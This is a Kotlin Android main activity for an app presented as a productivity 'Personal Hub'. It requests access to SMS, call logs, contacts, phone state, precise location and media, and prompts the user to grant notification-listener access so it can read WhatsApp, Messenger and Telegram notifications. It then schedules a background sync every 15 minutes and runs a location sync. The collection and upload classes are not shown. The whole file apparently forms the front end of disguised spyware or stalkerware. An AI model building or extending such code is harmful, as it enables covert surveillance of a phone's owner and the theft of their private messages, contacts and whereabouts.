package com.axesproductivite.hub

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var tvNotifStatus: TextView
    private lateinit var tvStatus: TextView
    private lateinit var btnNotifAccess: Button
    private lateinit var btnSync: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvNotifStatus  = findViewById(R.id.tvNotifStatus)
        tvStatus       = findViewById(R.id.tvStatus)
        btnNotifAccess = findViewById(R.id.btnNotifAccess)
        btnSync        = findViewById(R.id.btnSync)

        btnNotifAccess.setOnClickListener {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        }

        btnSync.setOnClickListener {
            tvStatus.text = "⏳ Synchronisation en cours…"
            WorkManager.getInstance(this)
                .enqueue(OneTimeWorkRequestBuilder<SyncWorker>().build())
            CoroutineScope(Dispatchers.IO).launch {
                LocationSync(applicationContext).sync()
            }
        }

        requestPermissions()
        schedulePeriodic()
    }

    override fun onResume() {
        super.onResume()
        updateUI()
    }

    private fun updateUI() {
        val notifOk = isNotificationListenerEnabled()
        tvNotifStatus.text = if (notifOk)
            "✅ Accès notifications : ACTIF\n(WhatsApp, Messenger, Telegram…)"
        else
            "❌ Accès notifications INACTIF\n→ Appuie sur le bouton ci-dessous"
        btnNotifAccess.isEnabled = !notifOk
        tvStatus.text = if (notifOk)
            "Personal Hub actif\nSync auto toutes les 15 min."
        else
            "En attente de l'autorisation…"
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }

    private fun requestPermissions() {
        val perms = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        val missing = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty())
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
    }

    private fun schedulePeriodic() {
        val req = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "periodic_sync", ExistingPeriodicWorkPolicy.KEEP, req
        )
    }
}
